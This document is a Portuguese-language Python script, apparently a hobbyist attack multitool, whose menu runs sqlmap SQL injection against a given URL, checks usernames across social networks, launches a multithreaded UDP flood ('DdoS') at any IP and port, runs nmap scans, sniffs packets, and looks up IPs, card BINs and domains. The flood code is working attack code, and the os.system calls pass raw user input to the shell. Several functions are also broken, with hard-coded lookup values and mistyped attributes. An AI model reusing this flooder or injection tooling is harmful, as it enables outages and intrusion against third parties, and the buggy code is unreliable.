# Importa as bilbiotecas necessárias

#  Bibliotecas de rede
import socket
import threading
import requests
import scapy
from scapy.all import *
from scapy.all import IP, sniff
import whois

# Bibliotecas visuais
import colorama
from colorama import Fore

#Bibliotecas padrão
import random
import time
import os
import sys
import platform

#Vê qual é o Sistema Operacional do usuário
sistema = platform.system()

# Início
if sistema == 'Windows':
   os.system('cls')
else:
   os.system('clear')
time.sleep(1)
user = input('[+] Escreva seu nome de usuário: ')
time.sleep(1.5)

# Definição de banners

def osintbanner():
    print(f"""    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⢀⣠⣾⣿⠿⠛⠉⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⢠⣾⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⢠⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⢹⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⢻⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠙⢿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣾⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠈⠙⠿⣿⣿⣶⣦⣤⣤⣤⣤⣶⣾⣿⡿⠛⠉⠻⢿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠻⠿⠟⠛⠛⠉⠁⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣦⣄⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣆
⠀⠀⠀⠀    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⠏

Ferramenta OSINT desenvolvida por: Berkxp
github profile: github.com/Berkxp

""")

def banner():
	print(Fore.CYAN + f"""
███████╗███████╗██████╗  █████╗  ██████╗ ██████╗     ████████╗███████╗███╗   ███╗██████╗  ██████╗ 
██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔═══██╗    ╚══██╔══╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗
█████╗  ███████╗██████╔╝███████║██║     ██║   ██║       ██║   █████╗  ██╔████╔██║██████╔╝██║   ██║
██╔══╝  ╚════██║██╔═══╝ ██╔══██║██║     ██║   ██║       ██║   ██╔══╝  ██║╚██╔╝██║██╔═══╝ ██║   ██║
███████╗███████║██║     ██║  ██║╚██████╗╚██████╔╝       ██║   ███████╗██║ ╚═╝ ██║██║     ╚██████╔╝
╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝        ╚═╝   ╚══════╝╚═╝     ╚═╝╚═╝      ╚═════╝ 
                                                                                                  
	                  [+] Obrigado por usar minha ferramenta {user}""")

# Função Osint    
def osint(urls):
    results = {}
    for url in urls:
        try:
            response = requests.get(url)
            if response.status_code == 200:
                # Verifique se o conteúdo contém uma mensagem que indica que o usuário não existe
                content = response.text.lower()
                if ("não encontrado" in content or 
                    "user not found" in content or 
                    "Esta página não está disponível." in content or 
                    "desculpe, ninguém no reddit tem esse nome." in content or
                    "Este conteúdo não está disponível no momento" in content):
                    results[url] =  Fore.RED + "Usuário não encontrado"
                else:
                    results[url] = Fore.GREEN + "Usuário encontrado"
            else:
                results[url] = Fore.RED + f"Error: {response.status_code}"
        except requests.exceptions.RequestException as e:
            results[url] = Fore.RED + f"Error while trying to access the website: {e}"

    return results

def ddos(target):
    targetip = target.split()[0]
    targetport = int(target.split()[1])
    mensagem = """Somos a Cyberteam!!"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Cria um socket UDP
    for i in range(100000): #Envia sla quantos coiso no ip e na porta
        sock.sendto(mensagem.encode(), (targetip, targetport))
        print(f'{threading.current_thread().name}: Packet {i + 1} Enviado ao ip: {targetip} pela porta: {targetport}.')

    sock.close() #Fecha o sokéti
    startddos(target)

def startddos(target):
    targetip = target.split()[0]
    threads = []
    for i in range(50):
        thread = threading.Thread(target=ddos, args=(target,), name=f'Thread-{i + 1}')
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

    print('DdoS concluído!')
    time.sleep(6)
    menu()    

def packetsniff(packet):
    if IP in packet:
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        print(f"Packet capturado: {ip_src} -> {ip_dst}")

def getip(urlipget):
    try:
        ip = socket.gethostbyname(urlipget)
        return ip
    except socket.gaierror:
        return f"[+] Erro ao tentar pegar o ip da url {urlipget}"

def iplookup(ip):
    url = f'https://ipinfo.io/143.95.107.249/json'
    try:
        response = requests.get(url)
        dados = response.json()
    except requests.RequestException as e:
        return f'[+] Erro ao consultar o ip: {ip}'

def binlookup(bininput):
    url = f"https://lookup.binlist.net/45717360"
    try:
        response = requests.get(url)
        if response.status_code == 200:
           dadosbin = response.json()
           return dadosbin
        else:
            return f'[+] Erro ao consultar a API'
    except requests.RequestException as e:
        return f"[+] Erro ao tentar consultar o BIN {bininput}"
    
def whoislookup(site):
    try:
        w = whois.whois(site)
        return w
    except Exception as e:
        print(f"[+] Erro ao consultar o site {site}")
        return None

def menu():
    while True:
       if sistema == 'Windows':
          os.system('cls')
       else:
          os.system('clear')
       banner()
       print('')
       print('	1) Sqli Automatizador')
       print('	2) Osint')
       print('	3) DdoS')
       print('	4) Network')
       print('	5) Lookups')
       print('')
       optionmenu = input('[+] Opção menu: ')
       if optionmenu == '01' or optionmenu == '1':
          if sistema == 'Windows':
             print('')
             print('[+] Opção não suportada ao seu sistema operacional')
             time.sleep(2)
             menu()
          else:
            print('')
            print(f'[+] Iniciando Automatizador Sqli Injection...') 
            print('')
            time.sleep(1.5)
            urlsql = input('[+] Type here the url:')
            print('')
            os.system(f'sqlmap -u {urlsql} --dbs')
            os.system(f'sqlmap -u {urlsql} --dbs --tables')
       elif optionmenu == '02' or optionmenu == '2':
            if sistema == 'Windows':
               os.system('cls')
            else:
               os.system('clear')

            osintbanner()
            userosint = str(input('[+] Insira o username ou apelido: '))
            urls = [
                f'https://youtube.com/@{userosint}',
                f'https://facebook.com/{userosint}',
                f'https://instagram.com/{userosint}',
                f'https://github.com/{userosint}',
                f'https://souncloud.com/{userosint}',
                f'https://x.com/@{userosint}',
                f'https://www.reddit.com/user/{userosint}',
                f'https://www.tiktok.com/@{userosint}',
                f'https://pinterest.com/{userosint}/',
                f'https://twitch.com/{userosint}',
                f'https://t.me/{userosint}',
                f''
            ]
            
            resultados = {}

            for url in urls:
                resultado = osint(urls)
                resultados[url] = resultado

            for url, resultado in resultado.items():
                print(Fore.RESET + '')
                print(f"[ {url} ]: {resultado}")

            backmenu = input(f'Voltar para o menu {user}?(sim/não) ')
            if backmenu == 'sim':
                menu()
            else:
                if sistema == 'Windows':
                    os.system('cls')
                    time.sleep(1)
                    exit()
                else:
                    os.system('clear')
                    time.sleep(1)
                    exit()

       elif optionmenu == '3' or optionmenu == '03':
          ddostarget = input('[+] Insira o ip e a porta (exemplo: 192.168.1.1 80): ')
          startddos(ddostarget)
       elif optionmenu == '4' or optionmenu == '04':
           if sistema == 'Windows':
               os.system('cls')
           else:
               os.system('clear')

           banner()
           print('')
           print('  1) Scan Port')
           print('  2) Packet Sniffer')
           print('  3) IP by url')
           print('')
           print('')
           optionet = input('[+] Escolha uma opção: ')
           if optionet == '01' or optionet == '1':
               iport = input('[+] Coloque o IP que vai ser escaneado: ')
               time.sleep(1)
               print('[+] Iniciando Scan...')
               os.system(f'nmap -sV -T5 {iport}')
               backmenu = input('[+] Voltar ao menu?(sim/não) ').lower()
               if backmenu == 'sim':
                   menu()
               else:
                   if sistema == 'Windows':
                      os.system('cls')
                   else:
                       os.system('clear')
           elif optionet == '02' or optionet == '2':
               ipalvo = input('[+] Digite o Ip que vai ocorrer o Sniffer: ')
               numpackets = int(input('[+] Quantos packets capturar? '))
               print("""[+] Para descobrir qual interface usar no packet sniffer, vou mostrar como faz:
                     
                     digite ipconfig no windows para descobrir
                     e ifconfig no linux
                     
                     se tiver alguma dúvida jogue o resultado no chat gpt e ele retornará qual sua interface.""")
               print('')
               interfaceuser = input('[+] Insira a interface que irá usar: ')
               print(f'[+] Capurando {numpackets} Packets no IP {ipalvo} ...')
               time.sleep(2)
               sniff(filter=f"host {ipalvo}", prn=packetsniff, count=numpackets, store=0, iface=interfaceuser)
               backmenu = input('[+] Voltar ao menu?(sim/não) ').lower()
               if backmenu == 'sim':
                   time.sleep(2)
                   menu()
               else:
                   if sistema == 'Windows':
                       os.system('cls')
                   else:
                       os.system('clear')
                    
                   exit()
           elif optionet == '03' or optionet == '3':
               urlipget = input('[+] Insira a URL (exemplo: google.com): ')
               ip = getip(urlipget)
               print(f'[+] O IP de {urlipget} é {ip}')
               backmenu = input('[+] Voltar ao menu?(sim/não) ').lower()
               if backmenu == 'sim':
                   menu()
               else:
                   if sistema == "Windows":
                       os.system('cls')
                       exit()
                   else:
                       os.system('clear')           
                       exit()
       elif optionmenu == '05' or optionmenu == '5':
           if sistema == 'Windows':
               os.system('cls')
           else:
               os.system('clear')

           banner()
           print('')
           print('  1) IP Lookup')
           print('  2) BIN Lookup')
           print('  3) Domain Lookup')
           print('')
           print('')
           escolhalookup = input('[+] Seleciona a opção desejada: ')
           if escolhalookup == '1' or escolhalookup == '01':
               ip = input('[+] Digite o IP para consulta: ')
               dados = iplookup(ip)
               if 'error' in dados:
                   print(Fore.RED + f'[+] Erro ao consultar o IP: {ip}')
                   print(Fore.CYAN + '')
               else:
                   print(Fore. GREEN + f'[+] Dados sobre o IP: {ip}')
                   print(f"[+] Cidade: {dados.get('city')}")
                   print(f"[+] Estado: {dados.get('region')}")
                   print(f'[+] País: {dados.get('country')}')
                   print(f'[+] Localização: {dados.get('loc')}')
                   print(f'[+] Postal: {dados.get('postal')}')
                   print(f'[+] Fuso horário: {dados.get('timezone')}')
               backmenu = input('[+] Voltar ao menu?(sim/não) ').lower()
               if backmenu == 'sim':
                   menu()
               else:
                   if sistema == 'Windows':
                       os.system('cls')
                   else:
                       os.system('clear')

                   exit()
           elif escolhalookup == '02' or escolhalookup == '2':
               bininput = input('[+] Insira o Bin para consulta: ')
               dadosbin = binlookup(bininput)
               if 'null' in dadosbin:
                   print(Fore.RED + f'[+] Erro ao consultar o BIN {bininput}')
                   print(Fore.CYAN + '')
               else:
                   print(f'[+] Exibindo Informações do BIN {bininput}:')
                   print(f'[+] Marca: {dadosbin.get("scheme")}')
                   print(f'[+] Tipo: {dadosbin.get("type")}')
                   print(f'[+] Nível: {dadosbin.get("brand")}')
                   print(f'[+] País: {dadosbin.get("country", {}).get("name")}')
                   print(f'[+] Banco: {dadosbin.get("bank", {}).get("name")}')
                   backmenu = input('[+] Voltar ao menu?(sim/não)').lower()
                   if backmenu == 'sim':
                       menu()
                   else:
                       if sistema == 'Windows':
                           os.system('cls')
                       else:
                           os.system('clear')

                       exit()
           elif escolhalookup == '3' or escolhalookup == '03':
               dominio = input('[+] Insira o domínio para consulta:')
               resultado = whoislookup(dominio)
               if resultado:
                   print(f'\n[+] Informações do domínio: {dominio}')
                   print(f"[+] Nome: {resultado.name}")
                   print(f"[+] Domínio: {resultado.domain_name}")
                   print(f"[+] Data de criação: {resultado.creation_data}")
                   print(f"[+] Data de expiração: {resultado.ecpiration_data}")
                   print(f"[+] Servidor DNS: {resultado.name_servers}")
                   print(f"[+] Email do registrante: {resultado.emails}")
               else:
                   print(f"Nenhuma informação encontrada para {dominio}")
               
               backmenu = input('[+] Voltar ao menu?(sim/não) ').lower()
               if backmenu == 'sim':
                   menu()
               else:
                   if sistema == 'Windows':
                       os.system('cls')
                   else:
                       os.system('clear')

               exit()
           else:
               print("[+] Opção inválida")
       else:
           print("[+] Opção inválida")

menu()